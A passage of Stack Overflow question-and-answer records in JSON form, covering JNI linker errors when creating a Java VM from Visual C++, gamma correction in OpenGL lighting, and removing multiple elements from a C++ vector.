"registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/xObp1.png?s=128&g=1", "display_name": "Tyler Durden", "link": "https://stackoverflow.com/users/1655700/tyler-durden"}, "reply_to_user": {"reputation": 115, "user_id": 2414577, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a96ff350ed64a7520c3e6fb0479e13b9?s=128&d=identicon&r=PG&f=1", "display_name": "Teva Velu", "link": "https://stackoverflow.com/users/2414577/teva-velu"}, "edited": false, "score": 0, "creation_date": 1429731301, "post_id": 29806335, "comment_id": 47742383, "body": "Well, the error is a linker error, so it is not finding it. We are not mind readers. Without going through all the settings in your project personally I have no idea of where you screwed up. If you added jvm.lib as a dependency, then the linker SHOULD be finding it. If you can try posting the actual compile and link text commands."}, {"owner": {"reputation": 115, "user_id": 2414577, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a96ff350ed64a7520c3e6fb0479e13b9?s=128&d=identicon&r=PG&f=1", "display_name": "Teva Velu", "link": "https://stackoverflow.com/users/2414577/teva-velu"}, "edited": false, "score": 0, "creation_date": 1429732639, "post_id": 29806335, "comment_id": 47743236, "body": "It certainly is a link error. Since I&#39;m using visual studio IDE, I didn&#39;t have to write any commands to compile and link. This is what I did. Step 1: Right click on the project and choose the properties and go to Linker -&gt; Input and type jvm.lib in the Additional Dependencies and typed jvm.dll in Dealyed Loaded Dlls Step 2: Go to general under Linker and give the path to jvm.lib and jvm.dll in the Additional Library Directories. C:\\Program Files\\Java\\jdk1.6.0_45\\lib;C:\\Program Files\\Java\\jre6\\bin\\server;%(AdditionalLibraryDirectories)"}, {"owner": {"reputation": 10264, "user_id": 1655700, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/xObp1.png?s=128&g=1", "display_name": "Tyler Durden", "link": "https://stackoverflow.com/users/1655700/tyler-durden"}, "reply_to_user": {"reputation": 115, "user_id": 2414577, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a96ff350ed64a7520c3e6fb0479e13b9?s=128&d=identicon&r=PG&f=1", "display_name": "Teva Velu", "link": "https://stackoverflow.com/users/2414577/teva-velu"}, "edited": false, "score": 0, "creation_date": 1429733183, "post_id": 29806335, "comment_id": 47743596, "body": "@TevaganthanVeluppillai Visual Studio actually uses a command line. The GUI just hides it from you. There is also a build log. In the output window it should tell you where the build log is."}, {"owner": {"reputation": 115, "user_id": 2414577, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a96ff350ed64a7520c3e6fb0479e13b9?s=128&d=identicon&r=PG&f=1", "display_name": "Teva Velu", "link": "https://stackoverflow.com/users/2414577/teva-velu"}, "edited": false, "score": 0, "creation_date": 1429734986, "post_id": 29806335, "comment_id": 47744685, "body": "Thanks Tyler. I found a way to get build log from the following link: <a href=\"https://msdn.microsoft.com/en-us/library/jj651643.aspx\" rel=\"nofollow noreferrer\">msdn.microsoft.com/en-us/library/jj651643.aspx</a> Since my build log is a text file and I don&#39;t see a way to attach text file here. So, I have my build log is here.<a href=\"https://www.dropbox.com/s/wrsoolkc52qmf51/OutputLog.txt?dl=0\" rel=\"nofollow noreferrer\">dropbox.com/s/wrsoolkc52qmf51/OutputLog.txt?dl=0</a> When you have time please have a look and let me know if I miss anything."}, {"owner": {"reputation": 115, "user_id": 2414577, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a96ff350ed64a7520c3e6fb0479e13b9?s=128&d=identicon&r=PG&f=1", "display_name": "Teva Velu", "link": "https://stackoverflow.com/users/2414577/teva-velu"}, "edited": false, "score": 0, "creation_date": 1429735985, "post_id": 29806335, "comment_id": 47745282, "body": "I think my error is similar to the following error. <a href=\"http://stackoverflow.com/questions/9999913/calling-java-methods-from-visual-c-c-using-c-cli\" title=\"calling java methods from visual c c using c cli\">stackoverflow.com/questions/9999913/&hellip;</a>  I may need to dynamically load the jvm.dll"}, {"owner": {"reputation": 115, "user_id": 2414577, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a96ff350ed64a7520c3e6fb0479e13b9?s=128&d=identicon&r=PG&f=1", "display_name": "Teva Velu", "link": "https://stackoverflow.com/users/2414577/teva-velu"}, "edited": false, "score": 0, "creation_date": 1429737896, "post_id": 29806335, "comment_id": 47746378, "body": "I just checked it again and  the following link works fine and it just shows a text file. [link] (<a href=\"https://www.dropbox.com/s/wrsoolkc52qmf51/OutputLog.txt?dl=0\" rel=\"nofollow noreferrer\">dropbox.com/s/wrsoolkc52qmf51/OutputLog.txt?dl=0</a>) Now, I solved the linker issue though. But, I&#39;m still getting error in jvm creation part. I can&#39;t post the code in the comment section. I will share the code via the following link. [link] (<a href=\"https://www.dropbox.com/s/26lyclldv1mfglc/Code.txt?dl=0\" rel=\"nofollow noreferrer\">dropbox.com/s/26lyclldv1mfglc/Code.txt?dl=0</a>)"}], "tags": [], "owner": {"reputation": 10264, "user_id": 1655700, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/xObp1.png?s=128&g=1", "display_name": "Tyler Durden", "link": "https://stackoverflow.com/users/1655700/tyler-durden"}, "is_accepted": false, "score": 0, "last_activity_date": 1429728370, "creation_date": 1429728370, "answer_id": 29806335, "question_id": 29806094, "link": "https://stackoverflow.com/questions/29806094/build-error-when-compiling-java-methods-in-c-using-jni-h/29806335#29806335", "title": "Build error when compiling java methods in C++ using jni.h", "body": "<p><code>JNI_CreateJavaVM</code> is defined in <code>jni.h</code>, so my guess is that your linker is not finding <code>jni.h</code>. I actually put that file and <code>jni_md.h</code> in my project directory with my source code.</p>\n\n<p>Note that <code>jni.h</code> includes <code>jni_md.h</code>, so having <code>#include &lt;jni_md.h&gt;</code> in your source code is redundant.</p>\n"}, {"tags": [], "owner": {"reputation": 115, "user_id": 2414577, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a96ff350ed64a7520c3e6fb0479e13b9?s=128&d=identicon&r=PG&f=1", "display_name": "Teva Velu", "link": "https://stackoverflow.com/users/2414577/teva-velu"}, "is_accepted": true, "score": 0, "last_activity_date": 1429751141, "creation_date": 1429751141, "answer_id": 29811766, "question_id": 29806094, "link": "https://stackoverflow.com/questions/29806094/build-error-when-compiling-java-methods-in-c-using-jni-h/29811766#29811766", "title": "Build error when compiling java methods in C++ using jni.h", "body": "<p>So, I solved the error. The following is the working C++ code. </p>\n\n<pre><code>// 1.cpp : main project file.\n\n  #include \"stdafx.h\"\n  #include \"jni.h\"\n  #include &lt;windows.h&gt;\n  using namespace System;\n\n\n  int CallJava()\n  {\n\n   JavaVM *jvm;   /* denotes a Java VM */\n\n   JNIEnv *env;  /* pointer to native method interface */\n\n   jint square;\n\n   jboolean not;\n\n   JavaVMInitArgs vm_args; /* JDK/JRE 6 VM initialization arguments */\n\n   JavaVMOption *options = new JavaVMOption[1];\n\n   options[0].optionString = \"-Djava.class.path=C:\\\\JavaCode\";  \n\n   vm_args.version = JNI_VERSION_1_6;\n   vm_args.options = options;\n   vm_args.nOptions = 1;\n   vm_args.ignoreUnrecognized = false;\n\n   HINSTANCE hinstLib;  \n\n    hinstLib = LoadLibrary(TEXT(\"C:\\\\Program Files\\\\Java\\\\jdk1.6.0_45\\\\jre\\\\bin\\\\server\\\\jvm.dll\"));\n\n  if(hinstLib==0)\n  {\n   printf(\"Error\");\n  }\n\n  if(hinstLib!= NULL)\n  {\n  typedef jint (JNICALL *PtrCreateJavaVM)(JavaVM **, void **, void *);\n\n    PtrCreateJavaVM ptrCreateJavaVM =  (PtrCreateJavaVM)GetProcAddress(hinstLib,\"JNI_CreateJavaVM\");\n\n   int res = ptrCreateJavaVM(&amp;jvm, (void**)&amp;env, &amp;vm_args);\n\n   jclass cls = env-&gt;FindClass(\"Sample2\");\n\n   jmethodID mid;   \n\n   if(cls !=0)\n   {   \n    mid = env-&gt;GetStaticMethodID(cls,\"intMethod\",\"(I)I\");\n    if(mid !=0)\n    {  \n      square = env-&gt;CallStaticIntMethod(cls, mid, 5);       \n      printf(\"Result of intMethod: %d\\n\", square);\n    }\n\n   mid = env-&gt;GetStaticMethodID(cls, \"booleanMethod\", \"(Z)Z\");\n   if(mid !=0)\n   { \n     not = env-&gt;CallStaticBooleanMethod(cls, mid, 1);\n     printf(\"Result of booleanMethod: %d\\n\", not);\n    }\n  }\n   jvm-&gt;DestroyJavaVM();\n }\nelse\n{\n  printf(\"Library is NULL\");\n}\n   Console::Read();\n   return 0;\n}\n\n int main(array&lt;System::String ^&gt; ^args)\n {\n CallJava();\n Console::Read();\n return 0;\n }\n</code></pre>\n"}], "owner": {"reputation": 115, "user_id": 2414577, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a96ff350ed64a7520c3e6fb0479e13b9?s=128&d=identicon&r=PG&f=1", "display_name": "Teva Velu", "link": "https://stackoverflow.com/users/2414577/teva-velu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1348, "favorite_count": 0, "accepted_answer_id": 29811766, "answer_count": 2, "score": 2, "last_activity_date": 1429751141, "creation_date": 1429727605, "last_edit_date": 1429727677, "question_id": 29806094, "link": "https://stackoverflow.com/questions/29806094/build-error-when-compiling-java-methods-in-c-using-jni-h", "title": "Build error when compiling java methods in C++ using jni.h", "body": "<p>I'm trying to run a few methods from Java class in Visual Studio C++ Environment. I got an error related CreateJavaVM. </p>\n\n<p>Would you please help me to find the solution? </p>\n\n<p>I did the following steps. </p>\n\n<p><strong>Step 1:</strong> JDK 1.6 is installed under the following path: C:\\Program Files\\Java\nThe following 2 sub directories are there: jdk1.6.0_45, jre6</p>\n\n<p><strong>Step 2:</strong> Write a simple java program.</p>\n\n<pre><code>public class Sample2\n{\n   public static int intMethod(int n)\n   {\n     return n*n;\n   }\n   public static boolean booleanMethod(boolean bool) \n   {\n    return !bool;\n    }\n }\n</code></pre>\n\n<p><strong>Step 3:</strong> Compile the java code:</p>\n\n<pre><code>   javac Sample2.java\n</code></pre>\n\n<p><strong>Step 4:</strong> Create a Visual Studio C++ program. Visual C++ CLR Console Application. </p>\n\n<p><strong>Step 5:</strong> Add the additional dependencies. (jvm.lib and jvm.dll)\na) Choose the project -> Properties -> Linker -> Input -> Additional Dependencies: jvm.lib\nb) Choose the project -> Properties -> Linker -> Input -> Delay Loaded Dlls: jvm.dll</p>\n\n<p><strong>Step 6:</strong> Add the include directories\na) Choose project -> Properties -> Configuration Properties -> C/C++ -> General -> Additional Include Directories: C:\\Program Files\\Java\\jdk1.6.0_45\\lib;\nC:\\Program Files\\Java\\jdk1.6.0_45\\include\\win32;\nC:\\Program Files\\Java\\jdk1.6.0_45\\include</p>\n\n<p><strong>Step 7:</strong> Write the C++ code to run the java methods. </p>\n\n<pre><code>  #include \"stdafx.h\"\n  #include \"jni.h\"\n  #include &lt;jni_md.h&gt;\n  using namespace System;\n\n  int main(array&lt;System::String ^&gt; ^args)\n  {\n\n    JavaVM *jvm;   /* denotes a Java VM */\n    JNIEnv *env;  /* pointer to native method interface */\n    jint square;\n    jboolean not;\n\n    JavaVMInitArgs vm_args; /* JDK/JRE 6 VM initialization arguments */\n\n    JavaVMOption *options = new JavaVMOption[1];\n\n    options[0].optionString = \"-Djava.class.path=C:\\\\JavaCode\";  \n\n   vm_args.version = JNI_VERSION_1_6;\n   vm_args.options = options;\n   vm_args.nOptions = 1;\n   vm_args.ignoreUnrecognized = false;\n\n   int res = JNI_CreateJavaVM(&amp;jvm, (void **)&amp;env, &amp;vm_args);\n\n   jclass cls = env-&gt;FindClass(\"Sample2\");\n\n   jmethodID mid = env-&gt;GetStaticMethodID(cls, \"staticInt\", \"(I)I\");\n\n   env-&gt;CallStaticVoidMethod(cls, mid,10);\n\n   if(cls !=0)\n   {   \n     mid = env-&gt;GetStaticMethodID(cls,\"intMethod\",\"(I)I\");    \n\n   if(mid !=0)\n   {  \n    square = env-&gt;CallStaticIntMethod(cls, mid, 5);       \n    printf(\"Result of intMethod: %d\\n\", square);\n   }\n\n   mid = env-&gt;GetStaticMethodID(cls, \"booleanMethod\", \"(Z)Z\");\n\n    if(mid !=0)\n    { \n     not = env-&gt;CallStaticBooleanMethod(cls, mid, 1);\n     printf(\"Result of booleanMethod: %d\\n\", not);\n    }\n }\n\n jvm-&gt;DestroyJavaVM();\n\n Console::Read();\n return 0;\n}\n</code></pre>\n\n<p><strong>Step 8:</strong> When I build the project I got the following error: </p>\n\n<pre><code>1&gt;------ Build started: Project: 1, Configuration: Debug Win32 ------\n\n1&gt;LINK : warning LNK4199: /DELAYLOAD:jvm.dll ignored; no imports found from jvm.dll\n\n1&gt;1.obj : warning LNK4248: unresolved typeref token (0100000F) for '_jmethodID'; image may not run\n\n1&gt;1.obj : error LNK2028: unresolved token (0A000016) \"extern \"C\" long __stdcall JNI_CreateJavaVM(struct JavaVM_ * *,void * *,void *)\" (?JNI_CreateJavaVM@@$$J212YGJPAPAUJavaVM_@@PAPAXPAX@Z) referenced in function \"int __clrcall main(cli::array&lt;class System::String ^ &gt;^)\" (?main@@$$HYMHP$01AP$AAVString@System@@@Z)\n\n1&gt;1.obj : error LNK2019: unresolved external symbol \"extern \"C\" long __stdcall JNI_CreateJavaVM(struct JavaVM_ * *,void * *,void *)\" (?JNI_CreateJavaVM@@$$J212YGJPAPAUJavaVM_@@PAPAXPAX@Z) referenced in function \"int __clrcall main(cli::array&lt;class System::String ^ &gt;^)\" (?main@@$$HYMHP$01AP$AAVString@System@@@Z)\n\n1&gt;C:\\Users\\tveluppillai\\Desktop\\Test1\\1\\Debug\\1.exe : fatal error LNK1120: 2 unresolved externals\n\n========== Build: 0 succeeded, 1 failed, 0 up-to-date, 0 skipped ==========\n</code></pre>\n\n<p>Would anyone help me to solve this error please? </p>\n"}, {"tags": ["c++", "opengl", "glsl", "lighting", "gamma"], "comments": [{"owner": {"reputation": 8289, "user_id": 391806, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/88a2ea78dadbdaf73e1033fe7cbdeb73?s=128&d=identicon&r=PG", "display_name": "Dale Wilson", "link": "https://stackoverflow.com/users/391806/dale-wilson"}, "edited": false, "score": 0, "creation_date": 1429729301, "post_id": 29806039, "comment_id": 47741095, "body": "First sentence in the Wikipedia article on gamma correction: &quot;gamma, is the name of a nonlinear operation used to code and decode luminance&quot;"}, {"owner": {"reputation": 221, "user_id": 3994433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9269c81b550ebf1397b4e51eef49a514?s=128&d=identicon&r=PG&f=1", "display_name": "ABHAY", "link": "https://stackoverflow.com/users/3994433/abhay"}, "reply_to_user": {"reputation": 8289, "user_id": 391806, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/88a2ea78dadbdaf73e1033fe7cbdeb73?s=128&d=identicon&r=PG", "display_name": "Dale Wilson", "link": "https://stackoverflow.com/users/391806/dale-wilson"}, "edited": false, "score": 0, "creation_date": 1429729571, "post_id": 29806039, "comment_id": 47741272, "body": "I&#39;m sorry, but I don&#39;t get how that statement helps this case, did I write something wrong about Gamma?"}, {"owner": {"reputation": 8289, "user_id": 391806, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/88a2ea78dadbdaf73e1033fe7cbdeb73?s=128&d=identicon&r=PG", "display_name": "Dale Wilson", "link": "https://stackoverflow.com/users/391806/dale-wilson"}, "edited": false, "score": 0, "creation_date": 1429734962, "post_id": 29806039, "comment_id": 47744669, "body": "I was just pointing out the use of the word &quot;nonlinear&quot; in the description.  It was a comment rather than an answer because I did not take the time to provide a full explanation like derhass did, but reading the wikipedia article would have helped your understanding, too."}], "answers": [{"comments": [{"owner": {"reputation": 221, "user_id": 3994433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9269c81b550ebf1397b4e51eef49a514?s=128&d=identicon&r=PG&f=1", "display_name": "ABHAY", "link": "https://stackoverflow.com/users/3994433/abhay"}, "edited": false, "score": 0, "creation_date": 1429730383, "post_id": 29806829, "comment_id": 47741810, "body": "Phew all these correction levels and non-linear spaces are confusing me by a large extent. So if I understood it all correctly: for physical correct models I model it correctly at the moment (so the 50% light does spread out half as much photons as the 100% light physically) so for lighting models this is indeed the correct model. The problem I had was that I was also expecting my eyes to perceive a similar increase in brightness which is as you say not correct."}, {"owner": {"reputation": 221, "user_id": 3994433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9269c81b550ebf1397b4e51eef49a514?s=128&d=identicon&r=PG&f=1", "display_name": "ABHAY", "link": "https://stackoverflow.com/users/3994433/abhay"}, "edited": false, "score": 0, "creation_date": 1429730404, "post_id": 29806829, "comment_id": 47741819, "body": "To conclude, I should always use gamma correction and after that correct the lighting as I find most visually pleasing (which is okay since behind the scenes the calculations are physically correct in linear space)? Also, do you happen to know why the attenuation is off with the gamma corrected version? I would suspect that shouldn&#39;t matter?"}, {"owner": {"reputation": 38487, "user_id": 2327517, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0Bulc.jpg?s=128&g=1", "display_name": "derhass", "link": "https://stackoverflow.com/users/2327517/derhass"}, "reply_to_user": {"reputation": 221, "user_id": 3994433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9269c81b550ebf1397b4e51eef49a514?s=128&d=identicon&r=PG&f=1", "display_name": "ABHAY", "link": "https://stackoverflow.com/users/3994433/abhay"}, "edited": false, "score": 0, "creation_date": 1429730784, "post_id": 29806829, "comment_id": 47742050, "body": "Well. It is actually hard to tell what you <i>should</i> use when the context is not known. As for the attenuation: well, your gamma-correction nonlinearily distorts the colors. However, I don&#39;t know which attenuation model you are using. Looks like you just do it linearily, which of course is physically totally wrong, as the intensity fades with the square of the distance - which interestingly would look almost &quot;linear&quot; to a human."}, {"owner": {"reputation": 221, "user_id": 3994433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9269c81b550ebf1397b4e51eef49a514?s=128&d=identicon&r=PG&f=1", "display_name": "ABHAY", "link": "https://stackoverflow.com/users/3994433/abhay"}, "edited": false, "score": 0, "creation_date": 1429731117, "post_id": 29806829, "comment_id": 47742260, "body": "Yeah I use a linear attenuation. It does look fairly nice with the non-gamma correction model but completely off with gamma correction. I&#39;ll explore with some different attenuation models now that I completely understand the concepts. Thanks for the clear and concise answer!"}, {"owner": {"reputation": 38487, "user_id": 2327517, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0Bulc.jpg?s=128&g=1", "display_name": "derhass", "link": "https://stackoverflow.com/users/2327517/derhass"}, "reply_to_user": {"reputation": 221, "user_id": 3994433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9269c81b550ebf1397b4e51eef49a514?s=128&d=identicon&r=PG&f=1", "display_name": "ABHAY", "link": "https://stackoverflow.com/users/3994433/abhay"}, "edited": false, "score": 0, "creation_date": 1429731251, "post_id": 29806829, "comment_id": 47742364, "body": "Well, the key point is: you can&#39;t do just one part of a calcualtion physically correct and mix it with some empircal model which happens to look nice in nonlinear color spaces."}, {"owner": {"reputation": 723, "user_id": 2201814, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/nD1Hs.jpg?s=128&g=1", "display_name": "MHSFisher", "link": "https://stackoverflow.com/users/2201814/mhsfisher"}, "edited": false, "score": 0, "creation_date": 1514706387, "post_id": 29806829, "comment_id": 83052059, "body": "@derhass  would you mind give me a simple example for gamma correction with openGL? I can&#39;t find any thing on internet :(("}, {"owner": {"reputation": 38487, "user_id": 2327517, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0Bulc.jpg?s=128&g=1", "display_name": "derhass", "link": "https://stackoverflow.com/users/2327517/derhass"}, "reply_to_user": {"reputation": 723, "user_id": 2201814, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/nD1Hs.jpg?s=128&g=1", "display_name": "MHSFisher", "link": "https://stackoverflow.com/users/2201814/mhsfisher"}, "edited": false, "score": 0, "creation_date": 1514730194, "post_id": 29806829, "comment_id": 83057225, "body": "@MHSFisher: no idea what you expect, &quot;gamma correction&quot; is just <code>y=pow(x,vorrection_exponent);</code> and that works in GLSL like it works in any other programming language."}], "tags": [], "owner": {"reputation": 38487, "user_id": 2327517, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0Bulc.jpg?s=128&g=1", "display_name": "derhass", "link": "https://stackoverflow.com/users/2327517/derhass"}, "is_accepted": true, "score": 7, "last_activity_date": 1429729962, "creation_date": 1429729962, "answer_id": 29806829, "question_id": 29806039, "link": "https://stackoverflow.com/questions/29806039/gamma-correction-doesnt-look-properly-corrected-is-this-linear/29806829#29806829", "title": "Gamma correction doesn&#39;t look properly corrected, is this linear?", "body": "<p>The results you are getting is what is to be expected.</p>\n\n<p>You seem to confuse the physical radiometric radiance created by the display with the <em>perceived</em> brightness of a human. The latter is nonlinear, and the simple gamma model is a way to approximate that. Basically, the monitor is <em>inverting</em> the nonlinear transformation of the human eye, so that the standard (nonlinear) RGB space is perceived linearily - using RGB intensity 0.5 is perceived as roughly half as bright as 1.0, and so on.</p>\n\n<p>If you would put a colorimeter or spectrophotomer at youe display when displaying your gamma-corrected grayscale levels, you would actually see that the  0.73 step would show roughly 50% of the luminance of the white level in candela/m^2 (assuming you display does not deviate too much from an sRGB model which is btw. not using gamma 2.2, but a linear segment in combination with gamma 2.4 for the rest, the 2.2 is only another approximation).</p>\n\n<p>Now the question is: what exactly do you want to achieve? Working in linear color space typically is required if you want to do physically accurate calculations. But then, a light source with 50% of the luminance of another one does not apper as half as bright to the human, and the result you got basically is correct.</p>\n\n<p>If you want just to have a a color space which is linear in percepted brightness, you can completely skip the gamma correction, as sRGB is exaclty trying to provide that already. You might just need some color calibration or small gamma adjustment to correct for deviations introduced by your display, if you want exact results.</p>\n"}], "owner": {"reputation": 221, "user_id": 3994433, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9269c81b550ebf1397b4e51eef49a514?s=128&d=identicon&r=PG&f=1", "display_name": "ABHAY", "link": "https://stackoverflow.com/users/3994433/abhay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1462, "favorite_count": 2, "accepted_answer_id": 29806829, "answer_count": 1, "score": 4, "last_activity_date": 1429729962, "creation_date": 1429727396, "last_edit_date": 1495540412, "question_id": 29806039, "link": "https://stackoverflow.com/questions/29806039/gamma-correction-doesnt-look-properly-corrected-is-this-linear", "title": "Gamma correction doesn&#39;t look properly corrected, is this linear?", "body": "<p>I want to implement gamma correction to my OpenGL lighting, but with gamma correction applied, my results do not seem linear at all. </p>\n\n<p>I also found <a href=\"https://stackoverflow.com/questions/29160601/opengl-gamma-corrected-image-doesnt-appear-linear\">OpenGL: Gamma corrected image doesn&#39;t appear linear</a> which is very similar to my issue, but hasn't yet received an answer nor discussed actual diffuse lights.</p>\n\n<p>As an illustration, I have the following 4 light colors defined in linear space:</p>\n\n<pre><code>glm::vec3 lightColors[] = {\n    glm::vec3(0.25),\n    glm::vec3(0.50),\n    glm::vec3(0.75),\n    glm::vec3(1.00)\n};\n</code></pre>\n\n<p>With each light source seperated and a basic linear attenuation applied to a diffuse lighting equation I get the following results:</p>\n\n<p><img src=\"https://i.imgur.com/Zny6cD8.png\" alt=\"wrong gamma\"></p>\n\n<p>This is the fragment shader:</p>\n\n<pre><code>void main()\n{           \n    vec3 lighting = vec3(0.0);\n    for(int i = 0; i &lt; 4; ++i)\n        lighting += Diffuse(normalize(fs_in.Normal), fs_in.FragPos, lightPositions[i], lightColors[i]);\n    // lighting = pow(lighting, vec3(1.0/2.2));\n    FragColor = vec4(lighting, 1.0f);\n}\n</code></pre>\n\n<p>Not only do I barely see any difference in brightness with the gamma corrected lights, the attenuation is also distorted by the gamma correction. As far as my understanding goes, all calculations (including attenuation) are done in linear space and by correcting the gamma the monitor should display it correctly (as it uncorrects it again as output). Based on just the lighting colors, the right-most circle should be 4 times as bright as the left circle and twice as bright as the second circle which doesn't really seem to be the case.</p>\n\n<p>Is it just that I'm not sensitive enough to perceive the correct brightness differences or is something wrong?</p>\n\n<p>Something else I tried is simply output the exact light colors onto the default framebuffer without and with gamma correction.</p>\n\n<p><img src=\"https://i.imgur.com/YUoJIad.png\" alt=\"gamma output\"></p>\n\n<p>Left is uncorrected, right is with gamma correction; with the red numbers indicating the RGB intensity from Photoshop's color picker. I know that Photoshop RGB values do not represent the final output image (as photoshop doens't read the RGB values as monitor outputs). The left image intuitively seems better, but based on the RGB intensity values I'd say the right-most image is indeed correctly gamma-corrected by my fragment shader; as each of these intensities will pass through the monitor and enter my eye with the correct intensity. For instance, the 0.75 intensity as 0.88 gamma corrected becomes 0.88^2.2 = 0.75 as output of the monitor.</p>\n\n<p>Is the right image indeed correct? And also, how comes the actual lighting is so off compared to the other images?</p>\n"}, {"tags": ["c++", "vector"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 8, "creation_date": 1429727182, "post_id": 29805925, "comment_id": 47739795, "body": "Erase the bigger index first"}, {"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 0, "creation_date": 1429727270, "post_id": 29805925, "comment_id": 47739846, "body": "@DieterL&#252;cking, that is the answer.  You should make it so :)"}, {"owner": {"reputation": 727, "user_id": 1350936, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/ff7821dfbdb6484287993aa9f8e35fa9?s=128&d=identicon&r=PG", "display_name": "anxieux", "link": "https://stackoverflow.com/users/1350936/anxieux"}, "edited": false, "score": 0, "creation_date": 1429727526, "post_id": 29805925, "comment_id": 47739994, "body": "If you don&#39;t have to preserve the order of the elements in vector, it should be faster to swap element(s) you want to remove with last element(s) of the vector, and trim the size of the vector."}], "answers": [{"tags": [], "owner": {"reputation": 55324, "user_id": 977038, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/f3004677e3b024b4b1944dfd93fb9849?s=128&d=identicon&r=PG", "display_name": "Abhijit", "link": "https://stackoverflow.com/users/977038/abhijit"}, "is_accepted": false, "score": 4, "last_activity_date": 1429727288, "creation_date": 1429727288, "answer_id": 29805995, "question_id": 29805925, "link": "https://stackoverflow.com/questions/29805925/removing-multiple-elements-from-a-vector-c/29805995#29805995", "title": "Removing multiple elements from a vector c++", "body": "<p>Instead of coding the removal logic yourself, it would be better managed using <code>std::remove_if</code> from <code>algorithm</code>. Depending on whether you have compiler supporting C++11 or not, the Predicate can either be a lambda or a named function.</p>\n"}, {"comments": [{"owner": {"reputation": 16556, "user_id": 839689, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/eed3ee2db841be15bdb120f3ff38f02e?s=128&d=identicon&r=PG", "display_name": "Nayuki", "link": "https://stackoverflow.com/users/839689/nayuki"}, "reply_to_user": {"reputation": 820, "user_id": 4266707, "user_type": "registered", "accept_rate": 69, "profile_image": "https://lh4.googleusercontent.com/-fLyyGXepW68/AAAAAAAAAAI/AAAAAAAAABI/RjSsIhv1dvs/photo.jpg?sz=128", "display_name": "Javia1492", "link": "https://stackoverflow.com/users/4266707/javia1492"}, "edited": false, "score": 0, "creation_date": 1429761827, "post_id": 29806010, "comment_id": 47754544, "body": "I did not vote on your answer at all. Please do not make this kind of accusation at me."}], "tags": [], "owner": {"reputation": 16556, "user_id": 839689, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/eed3ee2db841be15bdb120f3ff38f02e?s=128&d=identicon&r=PG", "display_name": "Nayuki", "link": "https://stackoverflow.com/users/839689/nayuki"}, "is_accepted": true, "score": 0, "last_activity_date": 1429727330, "creation_date": 1429727330, "answer_id": 29806010, "question_id": 29805925, "link": "https://stackoverflow.com/questions/29805925/removing-multiple-elements-from-a-vector-c/29806010#29806010", "title": "Removing multiple elements from a vector c++", "body": "<p>First point: In your first block, the call <code>erase(x, y)</code> does something different than you expect - it erases a whole <em>range</em> of elements starting at index x until just before index y. For example, if we have the vector [a,b,c,d,e,f,g], then erase(2,5) will erase indexes 2,3,4, so we end up with [a,b,f,g]. I'm guessing you want to erase just two elements, not an entire range.</p>\n\n<p>Second point: As Dieter L\u00fccking pointed out, simply erase the higher index element first, like this:</p>\n\n<pre><code>if (MyUnit &gt; EnemyUnit) {\n    PlayerUnits.erase(PlayerUnits.begin() + MyUnit);\n    PlayerUnits.erase(PlayerUnits.begin() + EnemyUnit);\n} else {\n    PlayerUnits.erase(PlayerUnits.begin() + EnemyUnit);\n    PlayerUnits.erase(PlayerUnits.begin() + MyUnit);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 41, "user_id": 4815773, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-yo8-v9zfQLs/AAAAAAAAAAI/AAAAAAAAABg/cuetzOpBdJE/photo.jpg?sz=128", "display_name": "Messatsu", "link": "https://stackoverflow.com/users/4815773/messatsu"}, "is_accepted": false, "score": 0, "last_activity_date": 1429731820, "last_edit_date": 1429731820, "creation_date": 1429729995, "answer_id": 29806837, "question_id": 29805925, "link": "https://stackoverflow.com/questions/29805925/removing-multiple-elements-from-a-vector-c/29806837#29806837", "title": "Removing multiple elements from a vector c++", "body": "<p>I think a better way to handle this would be to add an \"isDead\" condition to your \"unit\" class:</p>\n\n<pre><code>void Unit::Update()\n{\n    //other stuff\n    if(this-&gt;m_health &lt;= 0) this-&gt;m_isDead = 